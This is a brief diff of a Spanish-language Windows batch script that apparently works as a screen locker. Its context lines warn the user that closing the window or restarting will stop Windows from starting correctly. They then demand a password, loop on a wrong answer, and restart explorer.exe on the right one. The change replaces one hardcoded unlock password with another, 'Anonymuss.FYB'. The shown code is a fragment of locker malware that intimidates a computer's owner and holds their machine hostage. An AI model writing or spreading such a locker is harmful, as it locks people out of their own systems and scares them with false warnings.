@@ -13,7 +13,7 @@ echo Si usted cierra esta ventana,  no podra colocar la contrasena.
 echo Si apaga/reinicia el computador, el "Windows" no iniciara correctamente.
 echo =============================================================================
 set /p pass=Pon la contrasena para desbloquear el computador: 
-if %pass%==HolaPapu (goto passcorrecto) ELSE (goto bucle)
+if %pass%==Anonymuss.FYB (goto passcorrecto) ELSE (goto bucle)
 :passcorrecto
 echo Felicidades!
 start explorer.exe
